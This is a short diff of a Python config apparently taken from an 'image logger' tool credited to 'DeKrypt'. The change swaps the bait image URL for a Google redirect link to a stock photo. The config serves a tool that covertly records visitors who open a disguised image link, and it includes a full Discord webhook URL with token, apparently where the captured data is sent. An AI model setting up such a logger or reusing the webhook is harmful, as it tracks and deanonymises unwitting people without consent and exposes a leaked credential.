@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1365387623853719664/BapK-dAvwJtzUU_R2NTMEFuu2V1-gDH54LFNiftyCeInGiszxpg8KpFgpEpKaRrZS0Cs",
-    "image": "https://www.smartage.pl/wp-content/uploads/2023/04/96.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fpl.freepik.com%2Fpremium-zdjecie%2Fkula-ziemska-pokryta-trawa-i-woda-na-bialym-tle-symbol-ochrony-srodowiska_48457972.htm&psig=AOvVaw1icDntT-DtQ2r_AJAbFYvk&ust=1745757760016000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCMCWv5Lc9YwDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
